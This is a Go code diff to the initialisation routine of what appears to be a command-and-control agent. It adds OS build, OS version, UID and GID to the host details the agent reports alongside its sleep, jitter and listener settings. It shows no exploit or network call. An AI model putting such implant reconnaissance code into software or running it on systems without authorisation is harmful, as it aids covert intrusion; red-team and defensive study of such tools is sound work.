@@ -44,8 +44,20 @@ func InitAgent(rhost string, rport string, uri string, sleep int, jitter int, li
 	ppid := hg.GetCurrentPpid()
 
 	os := hg.GetOS()
+	osBuild := hg.GetOSBuild()
+	osVersion := hg.GetOSVersion()
 
 	username, err := GetUsername()
+	if err != nil {
+		return err
+	}
+
+	uid, err := hg.GetCurrentUid()
+	if err != nil {
+		return err
+	}
+
+	gid, err := hg.GetCurrentGid()
 	if err != nil {
 		return err
 	}
@@ -63,7 +75,11 @@ func InitAgent(rhost string, rport string, uri string, sleep int, jitter int, li
 		ProcessID:       pid,
 		ParentProcessID: ppid,
 		Username:        username,
+		UID:             uid,
+		GID:             gid,
 		OperatingSystem: os,
+		OSVersion:       osVersion,
+		OSBuild:         osBuild,
 		Sleep:           sleep,
 		Jitter:          jitter,
 		Listener:        listener,
